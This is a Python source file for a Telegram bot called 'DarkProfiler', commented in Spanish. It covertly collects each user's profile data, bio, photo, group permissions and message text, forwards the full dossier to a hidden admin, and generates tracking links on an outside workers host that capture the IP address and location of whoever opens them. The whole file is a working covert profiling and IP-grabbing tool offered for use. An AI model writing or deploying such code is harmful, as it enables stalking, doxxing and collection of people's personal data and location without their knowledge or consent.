import os
import logging
import aiohttp
import json
import secrets
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WORKER_URL = "https://galleta.societykark.workers.dev"  # Cambia si usas otro
if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID")

# ========== LOGS ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BASE DE DATOS TEMPORAL ==========
users_db = {}
tracking_codes = {}

# ========== MENÚ PRINCIPAL ==========
def menu_principal():
    keyboard = [
        [InlineKeyboardButton("📊 Mi perfil", callback_data="perfil")],
        [InlineKeyboardButton("🔗 Generar enlace", callback_data="tracking")],
        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== FUNCIONES ==========
async def get_user_full_info(bot, user, chat=None, message=None):
    info = {}
    info["id"] = user.id
    info["first_name"] = user.first_name or "N/A"
    info["last_name"] = user.last_name or "N/A"
    info["username"] = user.username or "N/A"
    info["username_url"] = f"https://t.me/{user.username}" if user.username else "N/A"
    info["language"] = user.language_code or "N/A"
    info["is_bot"] = user.is_bot
    info["is_premium"] = getattr(user, 'is_premium', False)
    
    try:
        chat_full = await bot.get_chat(user.id)
        info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
    except:
        info["bio"] = "No disponible"
    
    try:
        photos = await bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            info["photo_id"] = photos.photos[0][-1].file_id
            info["photo_count"] = photos.total_count
        else:
            info["photo_id"] = None
            info["photo_count"] = 0
    except:
        info["photo_id"] = None
        info["photo_count"] = 0
    
    if chat:
        info["chat_type"] = chat.type
        info["chat_id"] = chat.id
        if chat.type in ["group", "supergroup"]:
            info["chat_title"] = chat.title
            info["chat_members"] = getattr(chat, 'member_count', 'N/A')
        else:
            info["chat_title"] = "Privado"
            info["chat_members"] = 1
    
    if chat and chat.type in ["group", "supergroup"]:
        try:
            member = await bot.get_chat_member(chat.id, user.id)
            info["is_admin"] = member.status in ["administrator", "creator"]
            info["is_creator"] = member.status == "creator"
            info["can_restrict"] = getattr(member, 'can_restrict_members', False)
            info["can_delete"] = getattr(member, 'can_delete_messages', False)
            info["can_promote"] = getattr(member, 'can_promote_members', False)
        except:
            info["is_admin"] = False
            info["is_creator"] = False
    
    if message:
        info["message_id"] = message.message_id
        info["message_date"] = message.date.isoformat()
        if message.text:
            info["message_text"] = message.text[:200] + ("..." if len(message.text) > 200 else "")
        if hasattr(message, 'photo') and message.photo:
            info["has_photo"] = True
            info["photo_caption"] = message.caption or "Sin caption"
        if hasattr(message, 'document') and message.document:
            info["document_name"] = message.document.file_name
            info["document_size"] = message.document.file_size
        if hasattr(message, 'video') and message.video:
            info["video_duration"] = message.video.duration
            info["video_size"] = message.video.file_size
        if hasattr(message, 'sticker') and message.sticker:
            info["sticker_emoji"] = message.sticker.emoji
            info["sticker_set"] = message.sticker.set_name
    
    info["tracking_code"] = secrets.token_urlsafe(12)
    return info

def format_info_for_admin(info):
    msg = f"🕵️ *PERFIL COMPLETO*\n━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"👤 *Telegram*\n"
    msg += f"   • ID: `{info.get('id')}`\n"
    msg += f"   • Nombre: {info.get('first_name')}\n"
    msg += f"   • Apellido: {info.get('last_name')}\n"
    msg += f"   • Username: @{info.get('username')}\n"
    msg += f"   • Enlace: {info.get('username_url')}\n"
    msg += f"   • Idioma: {info.get('language')}\n"
    msg += f"   • Es bot: {'Sí' if info.get('is_bot') else 'No'}\n"
    msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"   • Biografía: {info.get('bio', 'N/A')}\n\n"
    msg += f"📸 *Foto de perfil*\n"
    msg += f"   • Cantidad: {info.get('photo_count', 0)}\n"
    msg += f"   • ID: `{info.get('photo_id', 'N/A')}`\n\n"
    msg += f"💬 *Chat actual*\n"
    msg += f"   • Tipo: {info.get('chat_type', 'N/A')}\n"
    msg += f"   • ID: `{info.get('chat_id', 'N/A')}`\n"
    msg += f"   • Título: {info.get('chat_title', 'N/A')}\n"
    msg += f"   • Miembros: {info.get('chat_members', 'N/A')}\n\n"
    if info.get('is_admin') is not None:
        msg += f"🔑 *Permisos*\n"
        msg += f"   • Admin: {'Sí' if info.get('is_admin') else 'No'}\n"
        msg += f"   • Creador: {'Sí' if info.get('is_creator') else 'No'}\n"
        msg += f"   • Restringir: {'Sí' if info.get('can_restrict') else 'No'}\n"
        msg += f"   • Eliminar: {'Sí' if info.get('can_delete') else 'No'}\n"
        msg += f"   • Promover: {'Sí' if info.get('can_promote') else 'No'}\n\n"
    if info.get('message_id'):
        msg += f"📩 *Último mensaje*\n"
        msg += f"   • ID: {info.get('message_id')}\n"
        msg += f"   • Fecha: {info.get('message_date')}\n"
        if info.get('message_text'):
            msg += f"   • Texto: {info.get('message_text')}\n"
    msg += f"\n🔗 *Código de tracking:* `{info.get('tracking_code')}`"
    return msg

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    message = update.message
    info = await get_user_full_info(context.bot, user, chat, message)
    users_db[user.id] = info
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=format_info_for_admin(info),
        parse_mode=ParseMode.MARKDOWN
    )
    if info.get("photo_id"):
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=info["photo_id"],
            caption=f"📸 Foto de perfil de {info['first_name']}"
        )
    await update.message.reply_text(
        "🕵️ *Perfil registrado*\n\nUsa el menú para más opciones.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_principal()
    )

async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info = users_db.get(user.id)
    if not info:
        await update.message.reply_text("❌ No tienes perfil. Usa /start.")
        return
    msg = f"📊 *Tu perfil público*\n\n"
    msg += f"👤 *Nombre:* {info.get('first_name')}\n"
    msg += f"📛 *Username:* @{info.get('username')}\n"
    msg += f"🆔 *ID:* `{info.get('id')}`\n"
    msg += f"🗣️ *Idioma:* {info.get('language')}\n"
    msg += f"⭐ *Premium:* {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"📖 *Bio:* {info.get('bio', 'N/A')}\n"
    msg += f"📸 *Fotos:* {info.get('photo_count', 0)}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = secrets.token_urlsafe(12)
    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
    link = f"https://galleta.societykark.workers.dev/track/{code}"
    if user.id in users_db:
        users_db[user.id]["tracking_code"] = code
    await update.message.reply_text(
        f"🔗 *Tu enlace de tracking*\n\n`{link}`\n\nCuando alguien abra este enlace, se capturará IP y ubicación.",
        parse_mode=ParseMode.MARKDOWN
    )
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔗 *Nuevo enlace generado*\n\nUsuario: {user.first_name} (@{user.username})\nCódigo: `{code}`\nEnlace: {link}",
        parse_mode=ParseMode.MARKDOWN
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    msg = f"📊 *Estadísticas*\n\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕵️ *DarkProfiler*\n\nComandos:\n/start - Registra perfil\n/perfil - Ver perfil\n/tracking - Genera enlace\n/stats - Estadísticas (admin)\n/help - Ayuda",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_principal()
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "perfil":
        await perfil(update, context)
        await query.delete_message()
    elif data == "tracking":
        await tracking(update, context)
        await query.delete_message()
    elif data == "stats":
        await stats(update, context)
        await query.delete_message()

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

def main():
    thread = Thread(target=run_http_server, daemon=True)
    thread.start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", perfil))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)
    logger.info("✅ DarkProfiler iniciado")
    app.run_polling()

if __name__ == "__main__":
    main()